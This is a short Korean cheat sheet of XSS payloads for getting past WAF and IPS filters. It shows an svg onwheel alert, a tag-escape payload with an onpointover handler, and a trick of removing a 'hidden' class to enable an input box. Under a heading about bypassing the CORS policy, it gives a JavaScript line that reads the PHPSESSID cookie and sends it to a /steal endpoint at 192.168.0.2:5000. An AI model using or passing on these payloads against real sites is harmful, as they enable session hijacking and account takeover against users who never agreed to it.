# xss 페이로드
"><svg/onwheel=alert'1'> 

(=onload 등 흔한 이벤트가 WAF, IPS에 필터링 되어 있을 때 우회)

aa"><onpointover="alert(1)"><input%20types="hidden"%20value=" 

(태그 탈출 후 img ,iframe등이 필터링되어 있을 때 우회)

<div class="~~~ -hidden"> 태그에서 hidden 삭제 후 활성화된 창에서 입력
  
(실제 우회 당시 게시판 내 링크 삽입 시 입력되는 창이 활성화되었음)

# CORS 정책 우회
;const img=new Image();img.src='http://192.168.0.2:5000/steal?PHPSESSID='+document.cookie.match(/PHPSESSID=([^;]+)/)[1];//'

